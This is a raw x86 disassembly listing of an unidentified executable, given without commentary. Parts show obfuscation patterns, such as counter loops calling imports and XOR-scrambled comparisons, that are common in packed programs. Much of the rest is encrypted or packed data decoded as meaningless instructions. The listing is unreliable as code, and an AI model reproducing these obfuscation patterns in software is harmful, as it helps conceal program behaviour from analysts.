  4039c1:	cmp    DWORD PTR ds:0x433687,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433687,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433687
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433687,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433697
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43367b,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x43367b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43367b,ebx
  403a19:	cmp    DWORD PTR ds:0x43367b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43367b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433757,0x19
  403a4c:	cmp    DWORD PTR ds:0x433757,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433757,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433757
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433757,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43379b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403a62
  403acb:	ret    
  403acc:	add    ch,cl
  403ace:	and    BYTE PTR [eax],dl
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403b55
  403ad7:	pop    es
  403ad8:	mov    ds:0x6daf48fd,eax
  403add:	mov    bh,0xbc
  403adf:	cmp    BYTE PTR [edx],bl
  403ae1:	test   ah,al
  403ae3:	mov    WORD PTR [edi-0x20ffce17],?
  403ae9:	jne    0x403b66
  403aeb:	jnp    0x403acd
  403aed:	sub    al,0xbd
  403aef:	jmp    0x403b44
  403af1:	add    al,0xfc
  403af3:	and    DWORD PTR [esi+0x6ea0abf5],ebx
  403af9:	lods   al,BYTE PTR ds:[esi]
  403afa:	repnz cmp edx,DWORD PTR [ebp+0x4]
  403afe:	scas   al,BYTE PTR es:[edi]
  403aff:	jecxz  0x403b29
  403b01:	push   ebp
  403b02:	push   0x2b
  403b04:	jge    0x403b0d
  403b06:	xchg   edi,eax
  403b07:	dec    BYTE PTR [ecx]
  403b09:	or     eax,0xace03b5e
  403b0e:	or     dl,BYTE PTR ds:0xb5ea9af0
  403b14:	sbb    ebp,DWORD PTR [edx+0x299fb119]
  403b1a:	cmc    
  403b1b:	ins    BYTE PTR es:[edi],dx
  403b1c:	mov    dl,BYTE PTR es:[ebx-0x3b]
  403b20:	jbe    0x403b57
  403b22:	jb     0x403b52
  403b24:	or     cl,0x94
  403b27:	add    eax,0xe0dfa7ce
  403b2c:	test   DWORD PTR [ebx-0x6b481923],0x296a0b69
  403b36:	push   eax
  403b37:	out    0x86,al
  403b39:	xchg   edi,eax
  403b3a:	add    BYTE PTR [eax+0x21ad1780],cl
  403b40:	fldcw  WORD PTR [eax-0x71032d48]
  403b46:	sti    
  403b47:	inc    ebp
  403b48:	sbb    eax,0xacf3090b
  403b4d:	idiv   DWORD PTR [ecx-0x64]
  403b50:	push   0x407c09a0
  403b55:	cmp    DWORD PTR [esi+0x78340980],ebx
  403b5b:	(bad)  
  403b5c:	push   ebx
  403b5d:	(bad)  
  403b5e:	and    eax,0x261947b1
  403b63:	pop    ebp
  403b64:	dec    eax
  403b65:	arpl   sp,cx
  403b67:	jbe    0x403af8
  403b69:	adc    DWORD PTR fs:[ecx],esi
  403b6c:	sub    DWORD PTR [edx],edi
  403b6e:	mov    ebx,0x5d0cb377
  403b73:	mov    esp,0xb1283bb7
  403b78:	or     eax,0x359e57cb
  403b7d:	mov    ebp,DWORD PTR cs:[ecx+esi*8+0x525ce759]
  403b85:	mov    dl,0xc7
  403b87:	mov    ch,0x49
  403b89:	push   esp
  403b8a:	mov    ds:0xddeb516b,eax
  403b8f:	js     0x403b29
  403b91:	addr16 push ebp
  403b93:	dec    eax
  403b94:	xchg   esp,eax
  403b95:	mov    ebp,0xf53b6539
  403b9a:	and    al,0xea
  403b9c:	lods   al,BYTE PTR ds:[esi]
  403b9d:	pop    ebp
  403b9e:	mov    esp,0x1c372d43
  403ba3:	xlat   BYTE PTR ds:[ebx]
  403ba4:	imul   esi,ebp,0x978ad370
  403baa:	int    0xfd
  403bac:	fwait
  403bad:	out    0x74,al
  403baf:	idiv   DWORD PTR [edx+0x6bc25553]
  403bb5:	ins    BYTE PTR es:[edi],dx
  403bb6:	cmp    cl,BYTE PTR [eax]
  403bb8:	dec    eax
  403bb9:	jo     0x403c12
  403bbb:	sub    BYTE PTR [eax-0x1e],al
  403bbe:	mov    ebx,0x94e7f48b
  403bc3:	fisttp WORD PTR [edx]
  403bc5:	xchg   DWORD PTR [ebx+0x360ab1e0],ebp
  403bcb:	imul   ebx,DWORD PTR ds:0x38cb37d8,0x54
  403bd2:	sbb    eax,0x31a2f65a
  403bd7:	mov    ebp,0xadc808e3
  403bdc:	fwait
  403bdd:	mov    ds:0x72b0d11d,al
  403be2:	ja     0x403b79
  403be4:	in     al,0x6b
  403be6:	and    ah,al
  403be8:	jbe    0x403b7e
  403bea:	sub    BYTE PTR [esi+eiz*4+0x51edbee2],0xc9
  403bf2:	mov    ch,0xb5
  403bf4:	and    al,0x19
  403bf6:	aad    0x6c
  403bf8:	jnp    0x403ba4
  403bfa:	xchg   edi,eax
  403bfb:	mov    bh,0x15
  403bfd:	out    dx,eax
  403bfe:	(bad)  
  403c00:	jb     0x403bad
  403c02:	sbb    eax,eax
  403c04:	iret   
  403c05:	in     eax,dx
  403c06:	jnp    0x403b96
  403c08:	addr16 popa 
  403c0a:	js     0x403c58
  403c0c:	jp     0x403bf3
  403c0e:	test   al,0xe1
  403c10:	(bad)  
  403c11:	shl    BYTE PTR [edi+0xff0d7a6],1
  403c17:	mov    edx,0xd5d61b27
  403c1c:	or     DWORD PTR [esi],0x2f
  403c1f:	iret   
  403c20:	in     eax,dx
  403c21:	in     eax,dx
  403c22:	mov    bh,0xd2
  403c24:	fdivr  DWORD PTR ds:0xd7ce93b2
  403c2a:	mov    ebp,DWORD PTR [edi]
  403c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c2d:	sbb    al,0xfe
  403c2f:	fs push esi
  403c31:	mov    edi,0xe00bd658
  403c36:	daa    
  403c37:	jns    0x403c06
  403c39:	or     DWORD PTR [esi+eax*4-0x4],0xbd3c466b
  403c41:	and    al,0x23
  403c43:	dec    eax
  403c44:	or     DWORD PTR [ecx-0x55],ecx
  403c47:	pop    es
  403c48:	mov    al,ds:0x1d1cb71
  403c4d:	pop    eax
  403c4e:	in     al,dx
  403c4f:	fbstp  TBYTE PTR [eax+0x69]
  403c52:	sbb    ch,BYTE PTR [ebx+0x49903923]
  403c58:	mov    ebx,0x78ce2870
  403c5d:	daa    
  403c5e:	imul   ecx,ebp,0xffffffe7
  403c61:	hlt    
  403c62:	(bad)  
  403c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c64:	(bad)  
  403c65:	(bad)  
  403c66:	arpl   WORD PTR [esi+edx*1],bp
  403c69:	int    0x46
  403c6b:	pop    ebx
  403c6c:	push   0xffffffa6
  403c6e:	ins    BYTE PTR es:[edi],dx
  403c6f:	rcr    DWORD PTR [ebx-0x79abe4d6],cl
  403c75:	outs   dx,BYTE PTR ds:[esi]
  403c76:	fld    QWORD PTR [ecx-0x13]
  403c79:	xor    al,0x5f
  403c7b:	out    0x4b,al
  403c7d:	test   bh,0x6
  403c80:	or     DWORD PTR [ebx-0x47],0x48952e63
  403c87:	daa    
  403c88:	faddp  st(7),st
  403c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c8b:	in     eax,dx
  403c8c:	push   es
  403c8d:	adc    BYTE PTR [esp+ebx*4-0x75],al
  403c91:	add    esi,DWORD PTR [edx-0x52]
  403c94:	xchg   DWORD PTR ss:[edx+0x50],esi
  403c98:	pop    es
  403c99:	sub    edi,DWORD PTR [edi]
  403c9b:	inc    ebp
  403c9c:	and    BYTE PTR [eax-0x5a678139],dh
  403ca2:	or     dh,cl
  403ca4:	cmp    BYTE PTR [esi],0xad
  403ca7:	cmp    al,0xfd
  403ca9:	push   esp
  403caa:	(bad)  [edx+0x2c]
  403cad:	inc    eax
  403cae:	push   es
  403caf:	rcl    ecx,1
  403cb1:	pusha  
  403cb2:	cmp    edx,DWORD PTR [edi]
  403cb4:	aas    
  403cb5:	in     al,dx
  403cb6:	mov    bh,0x35
  403cb8:	xchg   ebp,eax
  403cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cba:	popa   
  403cbb:	out    0x17,al
  403cbd:	pop    ds
  403cbe:	and    cl,BYTE PTR [ebx+eax*4+0x546b7ce]
  403cc5:	ret    0x3a9e
  403cc8:	pop    ecx
  403cc9:	mov    ch,0xe2
  403ccb:	(bad)  
  403ccc:	push   edx
  403ccd:	jb     0x403cc6
  403ccf:	mov    ch,0x1b
  403cd1:	enter  0xb18,0xb0
  403cd5:	sbb    eax,0x54fd23ca
  403cda:	sub    eax,0xa48c4c7f
  403cdf:	pop    ebp
  403ce0:	repnz ins BYTE PTR es:[edi],dx
  403ce2:	inc    ebx
  403ce3:	push   eax
  403ce4:	add    BYTE PTR [ecx],dh
  403ce6:	jge    0x403d2d
  403ce8:	or     ah,BYTE PTR [eax]
  403cea:	pop    ebx
  403ceb:	inc    edx
  403cec:	jg     0x403d41
  403cee:	(bad)  
  403cef:	and    al,0xb1
  403cf1:	retf   0x3fa1
  403cf4:	mov    ds:0xa252d446,eax
  403cf9:	sbb    al,BYTE PTR gs:[edx*1-0x39226e09]
  403d01:	or     DWORD PTR ss:[esi+edx*4],ebx
  403d05:	stos   DWORD PTR es:[edi],eax
  403d06:	cmp    DWORD PTR [ebx-0x7dc0f6af],esi
  403d0c:	mov    cl,0x22
  403d0e:	jb     0x403cc5
  403d10:	xchg   DWORD PTR [ebx-0x29],esi
  403d13:	xor    dh,BYTE PTR [esi+eiz*2-0x4f]
  403d17:	je     0x403d89
  403d19:	inc    esi
  403d1a:	addr16 push edx
  403d1c:	les    esp,FWORD PTR [edi+0x1b]
  403d1f:	push   edx
  403d20:	out    dx,al
  403d21:	cmc    
  403d22:	jecxz  0x403cac
  403d24:	ins    DWORD PTR es:[edi],dx
  403d25:	enter  0x99d6,0x1c
  403d29:	into   
  403d2a:	sbb    esi,ebx
  403d2c:	mov    al,ds:0x1967f7f0
  403d31:	retf   
  403d32:	mov    edi,DWORD PTR [ebx-0x168f5ebc]
  403d38:	aad    0xa0
  403d3a:	or     bl,BYTE PTR [edi]
  403d3c:	mov    eax,0x8bd28bdb
  403d41:	in     al,0x77
  403d43:	loop   0x403cdc
  403d45:	push   ebp
  403d46:	data16 fistp DWORD PTR [ecx+edx*2]
  403d4a:	les    eax,FWORD PTR [eax-0x6a057108]
  403d50:	add    bl,BYTE PTR [ebx-0xf0bf7db]
  403d56:	xchg   esp,edx
  403d58:	loope  0x403d5b
  403d5a:	sub    cl,BYTE PTR [edi]
  403d5c:	cmp    bh,BYTE PTR [edx+0x58]
  403d5f:	pmulhuw mm7,QWORD PTR [edx-0x67209b40]
  403d66:	aaa    
  403d67:	popa   
  403d68:	or     eax,0x50003798
  403d6d:	(bad)  
  403d6e:	int    0xe2
  403d70:	lock in ax,0xd
  403d74:	int3   
  403d75:	mov    esi,0x1ef48892
  403d7a:	cmp    eax,eax
  403d7c:	repnz sub esi,DWORD PTR [bx+si-0x3e20]
  403d82:	or     al,0x30
  403d84:	popf   
  403d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d86:	jmp    0x403d1d
  403d88:	push   ecx
  403d89:	aaa    
  403d8a:	cmp    dh,dh
  403d8c:	adc    eax,0xef3c49e6
  403d91:	(bad)  
  403d93:	mov    eax,0x37235159
  403d98:	push   eax
  403d99:	stos   BYTE PTR es:[edi],al
  403d9a:	mov    cl,0x79
  403d9c:	fldcw  WORD PTR [eax-0x1a]
  403d9f:	mov    edx,DWORD PTR [eax]
  403da1:	or     al,0x4f
  403da3:	shl    DWORD PTR [edi-0x21fc3361],0x8a
  403daa:	test   dh,al
  403dac:	push   ebp
  403dad:	or     eax,0xd96ec894
  403db2:	adc    dl,dh
  403db4:	stos   DWORD PTR es:[edi],eax
  403db5:	stc    
  403db6:	je     0x403db1
  403db8:	jne    0x403e33
  403dba:	add    eax,0xf05d8bbf
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffffbc
  403e75:	and    edi,DWORD PTR [esi-0x20]
  403e78:	or     bl,BYTE PTR [edi]
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403ef1
  403e81:	adc    al,0xde
  403e83:	imul   esi,DWORD PTR [ecx+0x799fbb6e],0xfffffff2
  403e8a:	pop    ebx
  403e8b:	inc    edi
  403e8c:	sbb    dh,BYTE PTR [ebx-0x37b0668e]
  403e92:	ret    0x6eba
  403e95:	gs aas 
  403e97:	rcl    dh,1
  403e99:	mov    ds:0x6c9f4752,al
  403e9e:	xchg   ebp,eax
  403e9f:	mov    al,0x7
  403ea1:	retf   0x7f1a
  403ea4:	int3   
  403ea5:	fbstp  TBYTE PTR [eax+eax*8-0x2c]
  403ea9:	jno    0x403ed5
  403eab:	imul   ecx,DWORD PTR [edi+ebp*1-0x2d],0x9820f878
  403eb3:	fdiv   QWORD PTR [edi-0x5]
  403eb6:	push   esi
  403eb7:	and    DWORD PTR [ebx+esi*4-0x75dd832b],esp
  403ebe:	scas   al,BYTE PTR es:[edi]
  403ebf:	idiv   eax
  403ec1:	xchg   esp,eax
  403ec2:	mov    eax,0xbd9e0b2b
  403ec7:	sbb    eax,0x9cd8bbb7
  403ecc:	aas    
  403ecd:	sbb    ch,BYTE PTR [esi-0x26b6c531]
  403ed3:	stos   DWORD PTR es:[edi],eax
  403ed4:	sbb    BYTE PTR [esi+edx*1+0x6d],dh
  403ed8:	cmp    al,0x37
  403eda:	add    al,0xde
  403edc:	and    DWORD PTR [edi-0x19d2734c],edx
  403ee2:	and    al,bl
  403ee4:	or     ecx,edi
  403ee6:	adc    BYTE PTR [esi+0x3c],bl
  403ee9:	ret    
  403eea:	sub    eax,0xc0a72f03
  403eef:	push   0x5a
  403ef1:	or     BYTE PTR [esi-0x197f4c19],dl
  403ef7:	mov    eax,ds:0x36f0f4d9
  403efc:	inc    edx
  403efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403efe:	ret    
  403eff:	sub    DWORD PTR [eax+0x10339f58],ebp
  403f05:	adc    al,0x2c
  403f07:	mov    ecx,0xeff0e5b1
  403f0c:	push   ss
  403f0d:	ins    DWORD PTR es:[edi],dx
  403f0e:	cmp    bl,BYTE PTR [edx-0x9]
  403f11:	mov    eax,ds:0xbf3e1395
  403f16:	or     DWORD PTR [ebx+0x7d],edx
  403f19:	cmp    esi,DWORD PTR [edi]
  403f1b:	bound  edx,QWORD PTR [esi+0x3d]
  403f1e:	xchg   ebx,eax
  403f1f:	fsub   QWORD PTR [esi+ebx*2]
  403f22:	pop    es
  403f23:	lea    eax,[ecx]
  403f25:	jecxz  0x403f80
  403f27:	(bad)  
  403f28:	pop    edx
  403f29:	inc    ecx
  403f2a:	scas   eax,DWORD PTR es:[edi]
  403f2b:	cwde   
  403f2c:	sbb    DWORD PTR [eax],ebp
  403f2e:	cmp    al,0xa1
  403f30:	test   BYTE PTR [esi+edi*2+0x34b9b2e9],ah
  403f37:	push   ebp
  403f38:	(bad)  
  403f3a:	jmp    0x5280ace8
  403f3f:	and    eax,0x8b8d8b66
  403f44:	push   eax
  403f45:	inc    esi
  403f46:	mov    WORD PTR [ecx-0x43],ss
  403f49:	sub    BYTE PTR [eax],0x9f
  403f4c:	test   DWORD PTR [esi],0xe4d9f8a9
  403f52:	nop
  403f53:	mul    DWORD PTR [ecx]
  403f55:	push   edx
  403f56:	sti    
  403f57:	aad    0x67
  403f59:	adc    eax,0x602ca8a9
  403f5e:	or     BYTE PTR [ecx+0x3819a564],ch
  403f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f65:	sbb    eax,0x8dae326a
  403f6a:	pop    ecx
  403f6b:	enter  0xcd5d,0x6b
  403f6f:	add    BYTE PTR [ebp*8+0x18c61dde],dh
  403f76:	pushf  
  403f77:	sbb    cl,BYTE PTR [ebx+0xa]
  403f7a:	mov    cl,0xdf
  403f7c:	jmp    0x403f73
  403f7e:	pop    eax
  403f7f:	xor    eax,0xbb188645
  403f84:	(bad)  
  403f86:	sbb    dh,BYTE PTR [eax+0x4d35f991]
  403f8c:	mov    al,0x51
  403f8e:	sti    
  403f8f:	push   ds
  403f90:	adc    BYTE PTR [ebp-0x42fe945c],0xee
  403f97:	repz inc ebp
  403f99:	cld    
  403f9a:	and    BYTE PTR [ebx+eax*2+0x1a],bh
  403f9e:	cld    
  403f9f:	push   eax
  403fa0:	sbb    ch,BYTE PTR [edx+0x1065a2c8]
  403fa6:	out    dx,eax
  403fa7:	jnp    0x403fb8
  403fa9:	and    dl,BYTE PTR [ecx]
  403fab:	call   0x67ca:0xdc12973f
  403fb2:	adc    edi,DWORD PTR [ebp+0x1c697c69]
  403fb8:	and    DWORD PTR [edi+edi*4],esp
  403fbb:	repnz loope 0x404039
  403fbe:	outs   dx,DWORD PTR ds:[esi]
  403fbf:	mov    ds:0xcf4b8edd,al
  403fc4:	adc    al,0x3c
  403fc6:	xchg   esp,eax
  403fc7:	cdq    
  403fc8:	push   es
  403fc9:	push   ss
  403fca:	or     eax,0xb6e548a6
  403fcf:	in     al,dx
  403fd0:	pop    esi
  403fd1:	mov    dl,BYTE PTR [ebp+ecx*1+0x7e]
  403fd5:	stos   DWORD PTR es:[edi],eax
  403fd6:	pop    ecx
  403fd7:	pop    ebx
  403fd8:	dec    edx
  403fd9:	xor    eax,0xe402ec09
  403fde:	ss jmp 0xd8c82538
  403fe4:	push   ebx
  403fe5:	pop    es
  403fe6:	(bad)  
  403fe7:	(bad)  [edx]
  403fe9:	xchg   esp,eax
  403fea:	xchg   esi,eax
  403feb:	out    0xb,al
  403fed:	cmp    BYTE PTR [ecx+0x75],bl
  403ff0:	aam    0xd5
  403ff2:	xor    esi,DWORD PTR [ebx]
  403ff4:	rcr    BYTE PTR [ebx+0x2d],cl
  403ff7:	repnz mov edi,0x4efea1de
  403ffd:	inc    edx
  403ffe:	jns    0x404027
  404000:	out    dx,eax
  404001:	xor    ebx,DWORD PTR [esi]
  404003:	xor    al,0x2e
  404005:	and    eax,0x2b67bab1
  40400a:	xor    bl,bl
  40400c:	or     al,0x72
  40400e:	loop   0x40406e
  404010:	push   ds
  404011:	inc    ecx
  404012:	mov    bl,0xea
  404014:	xchg   DWORD PTR [edi-0x3b0df94f],esp
  40401a:	adc    BYTE PTR [ecx],bl
  40401c:	and    eax,0x622fe9b9
  404021:	rcr    DWORD PTR [ebx-0x1b745b5f],0x98
  404028:	push   ecx
  404029:	sub    al,0x1b
  40402b:	inc    edx
  40402c:	xchg   ecx,eax
  40402d:	out    0xdf,al
  40402f:	(bad)  [ebp+eax*1+0x4]
  404033:	add    esp,DWORD PTR [ebp-0x25]
  404036:	and    BYTE PTR [ecx+ebp*8],dh
  404039:	cmp    ah,0xb
  40403c:	ret    0x3fa5
  40403f:	push   cs
  404040:	repnz push ds
  404042:	mov    DWORD PTR [ebx+0x21],ebx
  404045:	jmp    0xdbf6:0xa175078
  40404c:	jo     0x404028
  40404e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40404f:	inc    edx
  404051:	sbb    edx,ebx
  404053:	dec    DWORD PTR [edx-0x4e]
  404056:	and    BYTE PTR [eiz*2+0x3f73a44],ch
  40405d:	sbb    edx,DWORD PTR [ecx+0x7c]
  404060:	or     DWORD PTR [esi-0x2f4ffe94],ebx
  404066:	mov    dh,0xba
  404068:	fisttp QWORD PTR [ebp+0x7]
  40406b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40406c:	inc    ebp
  40406d:	fisub  DWORD PTR [esi-0x5e]
  404070:	jnp    0x40401c
  404072:	out    0xb4,eax
  404074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404075:	out    0x7f,eax
  404077:	lahf   
  404078:	stos   DWORD PTR es:[edi],eax
  404079:	jmp    0xceca36a9
  40407e:	in     al,dx
  40407f:	out    dx,eax
  404080:	mov    es,WORD PTR [ebp-0x367247b]
  404086:	mov    al,0x83
  404088:	jb     0x404096
  40408a:	adc    eax,0xa9a0b44a
  40408f:	jle    0x404049
  404091:	push   eax
  404092:	pop    es
  404093:	fimul  DWORD PTR [eax+0x3e862e61]
  404099:	mov    cl,BYTE PTR [ebx]
  40409b:	mov    eax,ds:0x2097e4c2
  4040a0:	xchg   ebp,eax
  4040a1:	dec    esp
  4040a2:	sub    DWORD PTR [ebx],ecx
  4040a4:	popa   
  4040a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040a6:	mov    al,0x9d
  4040a8:	retf   0xc81a
  4040ab:	mov    eax,0x60ccb31d
  4040b0:	add    BYTE PTR [ecx+0x5dca7c49],bl
  4040b6:	lods   eax,DWORD PTR ds:[esi]
  4040b7:	dec    edi
  4040b8:	scas   al,BYTE PTR es:[edi]
  4040b9:	imul   ecx,DWORD PTR [ebx+ecx*8-0x7],0x52dfb150
  4040c1:	rol    DWORD PTR [ebp+0x4b3a765],1
  4040c7:	cmc    
  4040c8:	jae    0x40407f
  4040ca:	cld    
  4040cb:	adc    DWORD PTR [edi],edx
  4040cd:	(bad)  
  4040ce:	std    
  4040cf:	push   eax
  4040d0:	lods   al,BYTE PTR ds:[esi]
  4040d1:	loop   0x40410f
  4040d3:	xchg   ebx,eax
  4040d4:	aaa    
  4040d5:	add    BYTE PTR [ecx],dh
  4040d7:	mov    bl,BYTE PTR fs:[edi]
  4040da:	fstp   QWORD PTR [edx]
  4040dc:	lods   eax,DWORD PTR ds:[esi]
  4040dd:	neg    BYTE PTR [eax+0x326d6f2f]
  4040e3:	mov    edi,0x99a67ac1
  4040e8:	outs   dx,DWORD PTR ds:[esi]
  4040e9:	sub    al,0x3b
  4040eb:	test   BYTE PTR [ecx-0x60],dl
  4040ee:	mov    DWORD PTR [edi-0xb],esp
  4040f1:	les    edx,FWORD PTR [edx]
  4040f3:	gs lock icebp 
  4040f6:	inc    esp
  4040f7:	xchg   esp,eax
  4040f8:	inc    edx
  4040f9:	mov    eax,0x43c28429
  4040fe:	push   ss
  4040ff:	push   edi
  404100:	aaa    
  404101:	mov    ebx,ebp
  404103:	call   0x8b85294f
  404108:	push   ecx
  404109:	retf   0x7b88
  40410c:	pop    ebx
  40410d:	repz hlt 
  40410f:	sub    eax,0x49580145
  404114:	inc    ebx
  404115:	and    ax,ax
  404118:	or     cl,BYTE PTR [edi]
  40411a:	jle    0x404138
  40411c:	mov    BYTE PTR [edi],dh
  40411e:	mov    esi,0x9beb86d3
  404123:	jecxz  0x40417a
  404125:	or     DWORD PTR [ecx],edi
  404127:	call   0x6da9e4d2
  40412c:	(bad)  
  40412d:	aaa    
  40412e:	xchg   esi,eax
  40412f:	adc    esi,ebp
  404131:	pop    eax
  404132:	in     eax,0xe0
  404134:	mov    es,eax
  404136:	xor    BYTE PTR [ebx-0x2421c50c],dh
  40413c:	stos   DWORD PTR es:[edi],eax
  40413d:	sub    ecx,ebx
  40413f:	and    al,BYTE PTR [esi]
  404141:	cwde   
  404142:	hlt    
  404143:	ret    0xe776
  404146:	das    
  404147:	test   al,0x5a
  404149:	call   0x7761:0xab31560f
  404150:	pop    edx
  404151:	sub    DWORD PTR [ebp-0x23],eax
  404154:	cmp    DWORD PTR [eax+esi*8+0x100e5e52],ecx
  40415b:	hlt    
  40415c:	xchg   ebp,edi
  40415e:	sub    cl,BYTE PTR [eax]
  404160:	add    esp,esp
  404162:	jmp    FWORD PTR [esi+ebx*2+0x3bdf2baa]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [eax+0x49],bh
  40418c:	lds    ebx,FWORD PTR [ebx+0x74]
  40418f:	sbb    eax,0x7c587e7e
  404194:	jle    0x404214
  404196:	in     al,0x25
  404198:	push   0xffffffde
  40419a:	push   ds
  40419b:	push   esi
  40419c:	pop    edi
  40419d:	cdq    
  40419e:	out    0x77,al
  4041a0:	loope  0x404123
  4041a2:	jbe    0x4041cc
  4041a4:	ror    BYTE PTR [ecx],0x58
  4041a7:	dec    ebp
  4041a8:	push   esp
  4041a9:	leave  
  4041aa:	xchg   esp,eax
  4041ab:	stc    
  4041ac:	neg    ebx
  4041ae:	add    DWORD PTR [edi+0x69acb9d],0x23a26ad5
  4041b8:	jle    0x404155
  4041ba:	jl     0x404146
  4041bc:	das    
  4041bd:	inc    ebp
  4041be:	js     0x4041a6
  4041c0:	jnp    0x404161
  4041c2:	dec    ecx
  4041c3:	lea    ebp,fs:[ebx-0x33]
  4041c7:	and    ecx,DWORD PTR [edi-0x62]
  4041ca:	adc    DWORD PTR [edx-0x421b7dff],0x751c8010
  4041d4:	cdq    
  4041d5:	mov    eax,0x34552526
  4041da:	ss scas eax,DWORD PTR es:[edi]
  4041dc:	aad    0x6e
